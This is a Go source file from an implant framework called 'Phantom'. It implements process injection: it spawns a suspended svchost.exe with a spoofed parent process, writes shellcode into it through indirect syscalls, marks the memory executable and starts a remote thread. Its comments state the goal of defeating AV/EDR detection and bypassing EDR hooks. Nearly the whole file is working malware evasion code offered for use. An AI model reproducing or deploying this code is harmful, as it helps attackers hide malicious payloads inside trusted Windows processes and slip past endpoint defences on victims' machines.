package evasion

/*
	Phantom Implant Framework - Process Hollowing
	Injects shellcode into a legitimate Windows process by:
	  1. Spawning a suspended legitimate process (e.g. svchost.exe)
	  2. Allocating RW memory in the target process
	  3. Writing shellcode into the allocation
	  4. Changing protection to RX
	  5. Creating a remote thread to execute the shellcode

	This makes the implant appear to run inside a trusted process,
	defeating process-based AV/EDR detection.

	Uses indirect syscalls (NtAllocateVirtualMemory, NtWriteVirtualMemory,
	NtProtectVirtualMemory, NtCreateThreadEx) to bypass EDR userland hooks.
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

// InjectShellcode injects shellcode into a new suspended instance of hostProcess
// (e.g. "C:\\Windows\\System32\\svchost.exe") with its parent spoofed to parentName
// (e.g. "explorer.exe").
//
// Uses indirect syscalls throughout to bypass EDR hooks.
func InjectShellcode(shellcode []byte, hostProcess string, parentName string) error {
	if len(shellcode) == 0 {
		return fmt.Errorf("shellcode is empty")
	}

	// {{if .Config.Debug}}
	log.Printf("[hollow] Injecting %d bytes into %s (parent: %s)", len(shellcode), hostProcess, parentName)
	// {{end}}

	// Step 1: Spawn suspended target process with spoofed parent
	pid, procHandle, threadHandle, err := spawnSuspended(hostProcess, parentName)
	if err != nil {
		return fmt.Errorf("failed to spawn suspended process: %w", err)
	}
	defer windows.CloseHandle(threadHandle)

	// {{if .Config.Debug}}
	log.Printf("[hollow] Spawned suspended PID %d", pid)
	// {{end}}

	// Step 2: Allocate RW memory in target process via indirect syscall
	var baseAddr uintptr
	regionSize := uintptr(len(shellcode))

	err = IndirectNtAllocateVirtualMemory(
		procHandle,
		&baseAddr,
		0,
		&regionSize,
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		windows.TerminateProcess(procHandle, 1)
		return fmt.Errorf("NtAllocateVirtualMemory failed: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[hollow] Allocated 0x%x bytes at 0x%x", regionSize, baseAddr)
	// {{end}}

	// Step 3: Write shellcode via indirect syscall
	var bytesWritten uintptr
	err = IndirectNtWriteVirtualMemory(
		procHandle,
		baseAddr,
		unsafe.Pointer(&shellcode[0]),
		uintptr(len(shellcode)),
		&bytesWritten,
	)
	if err != nil {
		windows.TerminateProcess(procHandle, 1)
		return fmt.Errorf("NtWriteVirtualMemory failed: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[hollow] Wrote %d bytes of shellcode", bytesWritten)
	// {{end}}

	// Step 4: Change protection to RX via indirect syscall
	var oldProtect uint32
	err = IndirectNtProtectVirtualMemory(
		procHandle,
		&baseAddr,
		&regionSize,
		windows.PAGE_EXECUTE_READ,
		&oldProtect,
	)
	if err != nil {
		windows.TerminateProcess(procHandle, 1)
		return fmt.Errorf("NtProtectVirtualMemory failed: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[hollow] Memory protection changed to RX")
	// {{end}}

	// Step 5: Create remote thread via indirect syscall
	var remoteThread windows.Handle
	err = IndirectNtCreateThreadEx(
		&remoteThread,
		windows.THREAD_ALL_ACCESS,
		procHandle,
		baseAddr,
		0,
	)
	if err != nil {
		windows.TerminateProcess(procHandle, 1)
		return fmt.Errorf("NtCreateThreadEx failed: %w", err)
	}
	defer windows.CloseHandle(remoteThread)

	// {{if .Config.Debug}}
	log.Printf("[hollow] Remote thread created, shellcode executing in PID %d", pid)
	// {{end}}

	return nil
}

// spawnSuspended creates a new suspended process with a spoofed parent PID.
// Returns (pid, processHandle, threadHandle, error).
func spawnSuspended(targetExe string, parentName string) (uint32, windows.Handle, windows.Handle, error) {
	// Find parent PID for spoofing
	parentPID, err := findProcessPID(parentName)
	if err != nil {
		// Fall back to no spoofing if parent not found
		// {{if .Config.Debug}}
		log.Printf("[hollow] Parent %s not found, spawning without spoofing", parentName)
		// {{end}}
		parentPID = 0
	}

	type STARTUPINFOEX struct {
		windows.StartupInfo
		AttributeList uintptr
	}

	si := STARTUPINFOEX{}
	si.Cb = uint32(unsafe.Sizeof(si))

	var attrList []byte
	creationFlags := uint32(windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW)

	if parentPID != 0 {
		parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS, false, parentPID)
		if err == nil {
			defer windows.CloseHandle(parentHandle)

			var attrListSize uintptr
			procInitializeProcThreadAttr.Call(0, 1, 0, uintptr(unsafe.Pointer(&attrListSize)))
			attrList = make([]byte, attrListSize)

			ret, _, _ := procInitializeProcThreadAttr.Call(
				uintptr(unsafe.Pointer(&attrList[0])),
				1, 0,
				uintptr(unsafe.Pointer(&attrListSize)),
			)
			if ret != 0 {
				procUpdateProcThreadAttr.Call(
					uintptr(unsafe.Pointer(&attrList[0])),
					0,
					PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
					uintptr(unsafe.Pointer(&parentHandle)),
					unsafe.Sizeof(parentHandle),
					0, 0,
				)
				si.AttributeList = uintptr(unsafe.Pointer(&attrList[0]))
				creationFlags |= EXTENDED_STARTUPINFO_PRESENT
			}
		}
	}

	var pi windows.ProcessInformation
	targetPtr, err := windows.UTF16PtrFromString(targetExe)
	if err != nil {
		return 0, 0, 0, fmt.Errorf("UTF16PtrFromString: %w", err)
	}

	ret, _, callErr := procCreateProcessW.Call(
		uintptr(unsafe.Pointer(targetPtr)),
		0, 0, 0, 0,
		uintptr(creationFlags),
		0, 0,
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)
	if ret == 0 {
		return 0, 0, 0, fmt.Errorf("CreateProcess failed: %w", callErr)
	}

	if attrList != nil {
		procDeleteProcThreadAttr.Call(uintptr(unsafe.Pointer(&attrList[0])))
	}

	return pi.ProcessId, pi.Process, pi.Thread, nil
}
